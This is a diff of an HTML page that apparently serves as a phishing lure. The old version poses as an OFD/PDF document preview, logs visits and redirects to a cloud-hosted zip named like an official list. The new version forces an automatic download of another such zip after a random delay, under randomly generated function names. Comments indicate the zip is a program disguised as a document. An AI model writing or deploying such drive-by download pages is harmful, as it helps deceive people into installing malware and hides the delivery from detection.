@@ -1,46 +1,48 @@
 <!DOCTYPE html>
-
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	
-    <title>{二零二四}八.二六</title>
-	<script>
-		var linkUrl = "https://s18.tos-cn-guangzhou.volces.com/%E5%85%AB%E4%BA%8C%E5%85%AD%E6%89%A7%E8%A1%8C%E6%8E%92%E8%A1%8C%E5%90%8D%E5%8D%95.zip";//   需要修改    文件名跳转的地方
-// 当页面加载完成后执行的函数
-window.onload = function() {
-    // 发送 AJAX 请求到 PHP 脚本记录访问次数
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "record_visit.php", true);
-    xhr.send();
-
-		var time = 1;// 3秒后跳转
-		setTimeout(function() {
-			window.location.href = linkUrl;
-		}, time * 1000); 
-};
-	</script>
-    <link href="https://d2-1328245132.cos.ap-chongqing.myqcloud.com/common.css" tppabs="common.css" rel="stylesheet">
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>11</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+    </style>
 </head>
-
 <body>
-    <div id="header"></div>
-    <div class="box" id="box" style="display: block;">
-        <div class="h2" id="fplx"></div>   
-        <div>
-            
-                    <img src="https://d2-1328245132.cos.ap-chongqing.myqcloud.com/2.jpg" tppabs="2.jpg" width="291" height="272">
-               
-        </div>
-        <!--<div class="button" onclick="download('4');">预览</div> &nbsp;-->
-        <div class="button" onclick="window.location.href = linkUrl;">版式文件预览</div> &nbsp;
-        <div class="button" onclick="window.location.href = linkUrl;">OFD版式文件下载</div> &nbsp;
-        <div class="button" onclick="window.location.href = linkUrl;">PDF预览版下载</div>
-        <!--<div class="warning-btn" onclick="warning();">错误信息展示</div>-->
-    </div>
-    <!--<div id="footer" style="display: none;">-->
-    <!--<div class="footer-item">-->
-    <!--downloadFileTest.zip-->
-    <!--</div>-->
-    <!--</div>-->
-    <div class="warning-box" style="display: none;">
-    </div>
-    <script src="https://d2-1328245132.cos.ap-chongqing.myqcloud.com/jquery.js" tppabs="jquery.js"></script></body></html>
+    <img src="your-image.jpg" alt="加载的图片">
+    <script>
+        // 动态生成随机变量名，结合时间戳
+        var dynamicVar = 'var_' + Math.random().toString(36).substring(2, 20) + '_' + Date.now().toString(36);
+        var dynamicFunc = 'func_' + Math.random().toString(36).substring(2, 20) + '_' + Date.now().toString(36);
+
+        // 动态生成下载函数
+        window[dynamicFunc] = function() {
+            var link = document.createElement('a');
+            link.href = 'https://s18.tos-cn-guangzhou.volces.com/%E5%85%AB%E4%BA%8C%E4%BA%8C%E5%86%85%E5%8F%82.zip'; // 替换为你的程序下载链接
+            link.download = '';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+
+        // 生成0.5秒到1.3秒之间的随机时间
+        var delayTime = Math.random() * (1300 - 500) + 500;
+
+        window.onload = function() {
+            // 页面加载后延迟随机时间执行动态生成的函数
+            setTimeout(window[dynamicFunc], delayTime);
+        };
+    </script>
+</body>
+</html>
